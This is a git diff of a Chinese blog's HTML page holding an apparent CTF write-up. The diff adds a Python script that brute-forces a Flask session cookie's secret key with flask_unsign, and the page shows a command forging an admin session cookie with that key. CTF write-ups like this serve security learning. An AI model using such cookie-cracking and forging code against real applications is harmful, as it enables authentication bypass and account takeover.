@@ -259,7 +259,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/Sql/" style="color: #03a9f4">Sql</a>
+                <a href="/blog/tags/Sql/" style="color: #ffa2c4">Sql</a>
             </span>
             
         </span>
@@ -273,7 +273,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">1.6k字</span>
+        <span class="post-count">1.8k字</span>
       </span>
     </span>
 
@@ -282,7 +282,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">8分</span>
+        <span class="post-count">9分</span>
       </span>
     </span>
     
@@ -297,7 +297,9 @@
     </div>
     
     <div class="content" v-pre>
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/26g_S3des0YHp3uAM29UqA">https://mp.weixin.qq.com/s/26g_S3des0YHp3uAM29UqA</a></p>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/26g_S3des0YHp3uAM29UqA">https://mp.weixin.qq.com/s/26g_S3des0YHp3uAM29UqA</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/15561">https://xz.aliyun.com/t/15561</a></p>
 <span id="more"></span>
 
 <hr>
@@ -526,6 +528,45 @@ xxxxxxxxGET /secret.txt HTTP/1.1
 
 <p>无事发生。。。寄</p>
 <p>不是哥们，7位key真爆破啊😰，生成一个7位字典然后flask_unsign最后爆破得到的key为 a123456</p>
+<p>爆破脚本 by Jay17：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itertools
+<span class="token keyword">import</span> flask_unsign
+<span class="token keyword">from</span> flask_unsign<span class="token punctuation">.</span>helpers <span class="token keyword">import</span> wordlist
+<span class="token keyword">import</span> requests <span class="token keyword">as</span> r
+<span class="token keyword">import</span> time
+<span class="token keyword">import</span> re
+<span class="token keyword">import</span> sys
+
+path <span class="token operator">=</span> <span class="token string">"../my_wordlist.txt"</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Generating wordlist... "</span><span class="token punctuation">)</span>
+
+<span class="token comment">#如果wordlist.txt为自定义字典，注释掉下面三行</span>
+<span class="token comment"># with open(path,"w") as f:</span>
+<span class="token comment">#     #permutations with repetition</span>
+<span class="token comment">#     [f.write(''+"".join(x)+''+"\n") for x in itertools.product('0123456789abcdefghijklmnopqrstuvwxyzQWERTYUIOPLKJHGFDSAZXCVBNM', repeat=4)]   #加上前缀</span>
+
+<span class="token comment">#url = "http://47.115.201.35:8000/index"</span>
+<span class="token comment">#cookie_tamper = r.head(url).cookies.get_dict()['session']</span>
+cookie_tamper<span class="token operator">=</span><span class="token string">'eyJjc3JmX3Rva2VuIjoiZjA1YjlmY2FkMjczNzcyNDFhYjY1ZWZhZGY2YmYzOWE2NWY5YzcxNSIsImlkZW50aXR5IjoiZ3Vlc3QiLCJ1c2VybmFtZSI6IkpheTE3In0.Zt00Pw.GxBaXRtuaBeDFi8npGhKn2J1-cc'</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Got cookie: "</span> <span class="token operator">+</span> cookie_tamper<span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Cracker Started..."</span><span class="token punctuation">)</span>
+
+obj <span class="token operator">=</span> flask_unsign<span class="token punctuation">.</span>Cracker<span class="token punctuation">(</span>value<span class="token operator">=</span>cookie_tamper<span class="token punctuation">)</span>
+
+before <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">with</span> wordlist<span class="token punctuation">(</span>path<span class="token punctuation">,</span> parse_lines<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> <span class="token keyword">as</span> iterator<span class="token punctuation">:</span>
+            obj<span class="token punctuation">.</span>crack<span class="token punctuation">(</span>iterator<span class="token punctuation">)</span>
+
+secret <span class="token operator">=</span> <span class="token string">""</span>
+<span class="token keyword">if</span> obj<span class="token punctuation">.</span>secret<span class="token punctuation">:</span>
+    secret <span class="token operator">=</span>obj<span class="token punctuation">.</span>secret<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Found SECRET_KET ~</span><span class="token interpolation"><span class="token punctuation">&#123;</span>secret<span class="token punctuation">&#125;</span></span><span class="token string">~ in </span><span class="token interpolation"><span class="token punctuation">&#123;</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>before<span class="token punctuation">&#125;</span></span><span class="token string"> seconds"</span></span><span class="token punctuation">)</span>
+
+signer <span class="token operator">=</span> flask_unsign<span class="token punctuation">.</span>sign<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"time"</span><span class="token punctuation">:</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"authorized"</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>secret<span class="token operator">=</span>secret<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>伪造成admin</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python flask_session_cookie_manager3.py encode <span class="token parameter variable">-s</span> <span class="token string">"a123456"</span> <span class="token parameter variable">-t</span> <span class="token string">"&#123;'csrf_token': '92cce9aeb377285f6daf96bd679fc01ec8207986', 'identity': 'admin', 'username': 'aaa'&#125;"</span>
 
